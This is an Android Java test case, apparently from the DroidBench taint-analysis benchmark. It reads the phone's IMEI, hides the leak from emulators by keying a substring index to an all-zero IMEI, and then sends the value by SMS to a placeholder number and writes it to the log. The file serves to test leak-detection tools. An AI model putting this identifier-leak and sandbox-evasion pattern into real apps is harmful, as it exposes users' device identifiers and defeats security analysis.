//package de.ecspride;
//
//import android.app.Activity;
//import android.content.Context;
//import android.os.Bundle;
//import android.telephony.SmsManager;
//import android.telephony.TelephonyManager;
//import android.util.Log;

/**
 * @testcase_name EmulatorDetection_IMEI
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sends the IMEI as an SMS message and writes it to the log file. Emulator detection
 * 		is performed by cutting the secret message at an index computed on the IMEI which is known
 * 		to always be 000..0 on an emulator.
 * @dataflow onCreate: imei -> SMS & Log 
 * @number_of_leaks 2
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {

	//@Override
	protected void onCreate(Bundle savedInstanceState) {
		//super.onCreate(savedInstanceState);
		//setContentView(R.layout.activity_main);
		
        //TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String imei, suffix, prefix, msg, newImei;
		int zeroPos;
		imei = TelephonyManager.getDeviceId(); //source
		suffix = "000000000000000";
		prefix = "secret";
		msg = prefix + suffix;
		
		zeroPos = 0;
		while (zeroPos < imei.length()) {
			if (imei.charAt(zeroPos) == '0')
				zeroPos = zeroPos + 1;
			else {
				zeroPos = 0;
				break;
			}
		}
		
		newImei = msg.substring(zeroPos, zeroPos + Math.min(prefix.length(), msg.length() - 1));
		Log.d("DROIDBENCH", newImei);

		//SmsManager sm = SmsManager.getDefault();
		SmsManager.sendTextMessage("+49 123", "", newImei, "", ""); //sink, potential leak
	}
	
}
